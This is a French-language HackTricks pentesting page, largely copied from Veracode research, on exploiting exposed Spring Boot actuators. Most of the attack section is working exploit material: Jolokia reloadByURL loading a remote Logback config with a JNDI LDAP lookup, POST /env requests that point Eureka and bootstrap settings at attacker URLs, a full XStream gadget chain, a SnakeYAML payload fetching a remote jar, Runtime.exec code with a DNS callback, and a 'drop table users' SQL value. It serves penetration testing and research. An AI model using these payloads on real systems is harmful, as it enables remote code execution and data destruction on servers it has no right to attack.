# Spring Actuators

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de cybers√©curit√© ? Voulez-vous voir votre entreprise annonc√©e dans HackTricks ? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Bypass d'authentification Spring**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**De** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploitation des actuateurs Spring Boot

**copi√© de** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Le framework Spring Boot comprend un certain nombre de fonctionnalit√©s appel√©es actuateurs pour vous aider √† surveiller et √† g√©rer votre application web lorsque vous la poussez en production. Destin√©s √† √™tre utilis√©s pour l'audit, la sant√© et la collecte de m√©triques, ils peuvent √©galement ouvrir une porte cach√©e vers votre serveur en cas de mauvaise configuration.

Lorsqu'une application Spring Boot est en cours d'ex√©cution, elle enregistre automatiquement plusieurs points de terminaison (tels que '/health', '/trace', '/beans', '/env' etc) dans le processus de routage. Pour Spring Boot 1 - 1.4, ils sont accessibles sans authentification, ce qui pose des probl√®mes importants en mati√®re de s√©curit√©. √Ä partir de la version Spring 1.5, tous les points de terminaison √† l'exception de '/health' et '/info' sont consid√©r√©s comme sensibles et s√©curis√©s par d√©faut, mais cette s√©curit√© est souvent d√©sactiv√©e par les d√©veloppeurs d'applications.

Les points de terminaison Actuator suivants pourraient potentiellement avoir des implications de s√©curit√© conduisant √† des vuln√©rabilit√©s possibles :

* /dump - affiche un dump de threads (y compris une trace de la pile)
* /trace - affiche les derniers messages HTTP (qui pourraient inclure des identifiants de session)
* /logfile - affiche le contenu du fichier journal
* /shutdown - arr√™te l'application
* /mappings - montre tous les mappages de contr√¥leur MVC
* /env - fournit un acc√®s √† l'environnement de configuration
* /actuator/env
* /restart - red√©marre l'application
* /heapdump - construit et renvoie un dump de tas √† partir du JVM utilis√© par notre application

Pour Spring 1x, ils sont enregistr√©s sous l'URL racine, et dans 2x, ils ont √©t√© d√©plac√©s vers le chemin de base "/actuator/".

**Exploitation :**

La plupart des actuateurs ne prennent en charge que les requ√™tes GET et r√©v√®lent simplement des donn√©es de configuration sensibles, mais plusieurs d'entre eux sont particuli√®rement int√©ressants pour les chasseurs de shell :

**1. Ex√©cution de code √† distance via '/jolokia'**

Si la biblioth√®que Jolokia est dans le chemin de classe de l'application cible, elle est automatiquement expos√©e par Spring Boot sous le point de terminaison '/jolokia' de l'actuateur. Jolokia permet l'acc√®s HTTP √† tous les MBeans enregistr√©s et est con√ßu pour effectuer les m√™mes op√©rations que celles que vous pouvez effectuer avec JMX. Il est possible de lister toutes les actions MBeans disponibles en utilisant l'URL :

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Encore une fois, la plupart des actions MBeans ne r√©v√®lent que des donn√©es syst√®me, mais l'une d'entre elles est particuli√®rement int√©ressante :

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_jolokia.png)

L'action '**reloadByURL**', fournie par la biblioth√®que Logback, nous permet de recharger la configuration de journalisation √† partir d'une URL externe. Elle peut √™tre d√©clench√©e simplement en naviguant vers : [**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Alors, pourquoi devrions-nous nous soucier de la configuration de journalisation ? Principalement pour deux raisons :

1. La configuration a un format XML, et bien s√ªr, Logback l'analyse avec les entit√©s externes activ√©es, ce qui le rend vuln√©rable √† l'XXE aveugle.
2. La configuration Logback a la fonctionnalit√© ['Obtaining variables from JNDI'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI). Dans le fichier XML, nous pouvons inclure une balise comme '**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**' et l'attribut name sera transmis √† la m√©thode DirContext.lookup(). Si nous pouvons fournir un nom arbitraire dans la fonction .lookup(), nous n'avons m√™me pas besoin d'XXE ou de HeapDump car cela nous donne une **ex√©cution de code √† distance compl√®te**.

**Comment √ßa marche :**

1. Un attaquant demande l'URL mentionn√©e ci-dessus pour ex√©cuter la fonction 'reloadByURL', fournie par la classe 'qos.logback.classic.jmx.JMXConfigurator'.

2. La fonction 'reloadByURL' t√©l√©charge une nouvelle configuration depuis [http://artsploit.com/logback.xml](http://artsploit.com/logback.xml) et l'analyse en tant que configuration Logback. Cette configuration malveillante devrait avoir le contenu suivant :
```
<configuration>
  <insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. Lorsque ce fichier est analys√© sur le serveur vuln√©rable, il cr√©e une connexion vers le serveur LDAP contr√¥l√© par l'attaquant sp√©cifi√© dans la valeur du param√®tre "env-entry-name", ce qui conduit √† une r√©solution JNDI. Le serveur LDAP malveillant peut renvoyer un objet de type 'R√©f√©rence' pour d√©clencher une **ex√©cution du bytecode fourni** sur l'application cible. Les attaques JNDI sont bien expliqu√©es dans ce [document de recherche de MicroFocus](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf). La [nouvelle technique d'exploitation JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) (d√©crite pr√©c√©demment dans notre blog) fonctionne √©galement ici, car Tomcat est le serveur d'application par d√©faut dans le framework Spring Boot.

**2. Modification de la configuration via '/env'**

Si les biblioth√®ques Spring Cloud sont dans le classpath, le point de terminaison **'/env'** vous permet de modifier les propri√©t√©s environnementales de Spring. Tous les beans annot√©s avec '**@ConfigurationProperties**' peuvent √™tre modifi√©s et r√©associ√©s. De nombreuses propri√©t√©s que nous pouvons contr√¥ler, mais pas toutes, sont r√©pertori√©es sur le point de terminaison '/configprops' de l'actuateur. En fait, il y en a des tonnes, mais il n'est absolument pas clair de savoir ce que nous devons modifier pour atteindre quelque chose. Apr√®s avoir pass√© quelques jours √† jouer avec eux, nous avons trouv√© ceci:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
 
eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
Cette propri√©t√© modifie l'URL de service Eureka vers une valeur arbitraire. Eureka Server est normalement utilis√© comme serveur de d√©couverte, et presque toutes les applications Spring Cloud s'y enregistrent et y envoient des mises √† jour d'√©tat. Si vous avez la chance d'avoir Eureka-Client <1.8.7 dans le classpath cible (il est normalement inclus dans Spring Cloud Netflix), vous pouvez exploiter la vuln√©rabilit√© de d√©s√©rialisation XStream en elle. Tout ce que vous avez √† faire est de d√©finir la propri√©t√© 'eureka.client.serviceUrl.defaultZone' sur votre URL de serveur ([http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)) via '/env' et ensuite appeler l'endpoint '/refresh'. Apr√®s cela, votre serveur devrait servir la charge utile XStream avec le contenu suivant:
```markup
<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                      <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
Ce payload XStream est une version l√©g√®rement modifi√©e de la cha√Æne de gadgets ImageIO JDK-only de la recherche [Marshalsec](https://github.com/mbechler/marshalsec). La seule diff√©rence ici est l'utilisation de **LinkedHashSet** pour d√©clencher la m√©thode 'jdk.nashorn.internal.objects.NativeString.hashCode()'. Le payload original utilise java.lang.Map pour obtenir le m√™me comportement, mais la configuration XStream d'Eureka a un [convertisseur personnalis√© pour les maps](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58) qui le rend inutilisable. Le payload ci-dessus n'utilise pas de maps du tout et peut √™tre utilis√© pour obtenir une ex√©cution de code √† distance sans contraintes suppl√©mentaires.

En utilisant Spring Actuators, vous pouvez en fait exploiter cette vuln√©rabilit√© m√™me si vous n'avez pas acc√®s √† un serveur Eureka interne ; vous avez seulement besoin d'un point de terminaison "/env" disponible.

**Autres param√®tres utiles :**

**spring.datasource.tomcat.validationQuery=drop+table+users** - vous permet de sp√©cifier n'importe quelle requ√™te SQL, qui sera automatiquement ex√©cut√©e contre la base de donn√©es actuelle. Cela peut √™tre n'importe quelle instruction, y compris insert, update ou delete.

![Exploiting Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_drop\_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - vous permet de modifier la cha√Æne de connexion JDBC actuelle.

Le dernier est int√©ressant, mais le probl√®me est que lorsque l'application ex√©cutant la connexion √† la base de donn√©es est d√©j√† √©tablie, la simple mise √† jour de la cha√Æne JDBC n'a aucun effet. Heureusement, il existe une autre propri√©t√© qui peut nous aider dans ce cas :

**spring.datasource.tomcat.max-active**=777

Le tour que nous pouvons utiliser ici est d'augmenter le nombre de connexions simultan√©es √† la base de donn√©es. Ainsi, nous pouvons changer la cha√Æne de connexion JDBC, augmenter le nombre de connexions, et apr√®s cela envoyer de nombreuses requ√™tes √† l'application pour simuler une charge importante. Sous la charge, l'application cr√©era une nouvelle connexion √† la base de donn√©es avec la cha√Æne JDBC malveillante mise √† jour. J'ai test√© cette technique localement contre Mysql et cela fonctionne parfaitement.

![Exploiting Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_max\_active.png)

Outre cela, il y a d'autres propri√©t√©s qui semblent int√©ressantes, mais qui, en pratique, ne sont pas vraiment utiles :

**spring.datasource.url** - cha√Æne de connexion √† la base de donn√©es (utilis√©e uniquement pour la premi√®re connexion)

**spring.datasource.jndiName** - cha√Æne JNDI de la base de donn√©es (utilis√©e uniquement pour la premi√®re connexion)

**spring.datasource.tomcat.dataSourceJNDI** - cha√Æne JNDI de la base de donn√©es (pas du tout utilis√©e)

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - url de configuration de nuage de printemps (n'a aucun effet apr√®s le d√©marrage de l'application, seules les valeurs initiales sont utilis√©es).

Ces propri√©t√©s n'ont aucun effet √† moins que le point de terminaison '/restart' ne soit appel√©. Ce point de terminaison red√©marre tous les ApplicationContext, mais il est d√©sactiv√© par d√©faut.

Il y a beaucoup d'autres propri√©t√©s int√©ressantes, mais la plupart d'entre elles n'ont pas d'effet imm√©diat apr√®s le changement.

**N.B.** Dans Spring Boot 2x, le format de requ√™te pour modifier les propri√©t√©s via le point de terminaison '/env' est l√©g√®rement diff√©rent (il utilise le format json √† la place), mais l'id√©e est la m√™me.

**Un exemple d'application vuln√©rable :**

Si vous voulez tester cette vuln√©rabilit√© localement, j'ai cr√©√© une [simple application Spring Boot sur ma page Github](https://github.com/artsploit/actuator-testbed). Tous les payloads devraient fonctionner l√†-bas, sauf les param√®tres de base de donn√©es (√† moins que vous ne les configuriez).

**D√©couverte en bo√Æte noire :**

Une liste compl√®te des actuateurs par d√©faut peut √™tre trouv√©e ici : [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt). Gardez √† l'esprit que les d√©veloppeurs d'applications peuvent cr√©er leurs propres points de terminaison en utilisant l'annotation @Endpoint.

**Mise √† jour de mai 2019 :**

Il existe un moyen plus fiable d'obtenir une RCE via une modification des propri√©t√©s environnementales de Spring :
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
 
spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
Cette requ√™te modifie la propri√©t√© 'spring.cloud.bootstrap.location', qui est utilis√©e pour charger une configuration externe et la parser en format YAML. Pour que cela se produise, nous devons √©galement appeler l'endpoint '/refresh'.
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Lorsque la configuration YAML est r√©cup√©r√©e depuis le serveur distant, elle est analys√©e avec la biblioth√®que SnakeYAML, qui est √©galement susceptible d'√™tre attaqu√©e par d√©s√©rialisation. La charge utile (yaml-payload.yml) peut √™tre g√©n√©r√©e en utilisant la recherche Marshalsec mentionn√©e ci-dessus :
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
  ]]
]
```
La d√©s√©rialisation de ce fichier d√©clenche l'ex√©cution du constructeur de ScriptEngineManager avec le URLClassLoader fourni. En bref, cela conduit √† la m√©thode 'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)', qui tente de trouver toutes les impl√©mentations de l'interface 'ScriptEngineFactory' dans toutes les biblioth√®ques du classpath. Comme nous pouvons ajouter une nouvelle biblioth√®que via URLClassLoader, nous pouvons servir une nouvelle 'ScriptEngineFactory' avec le bytecode malveillant √† l'int√©rieur. Pour ce faire, nous devons cr√©er une archive jar avec les fichiers obligatoires suivants: [yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) doit contenir le bytecode r√©el, avec la charge utile malveillante dans le constructeur.
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```
Le fichier [yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) devrait √™tre juste un fichier texte contenant une r√©f√©rence compl√®te √† 'artsploit.AwesomeScriptEngineFactory', afin que le ServiceLoader sache o√π trouver la classe: **artsploit.AwesomeScriptEngineFactory**. Encore une fois, cette technique d'exploitation n√©cessite que Spring Cloud soit dans le classpath, mais en comparaison avec la charge utile XStream d'Eureka, elle fonctionne m√™me dans la derni√®re version. Vous pouvez trouver la charge utile compl√®te dans mon projet github: [yaml-payload](https://github.com/artsploit/yaml-payload).

## Env + H2 RCE

Consultez cette page pour savoir comment exploiter la combinaison /env + H2: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## Plus d'informations

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
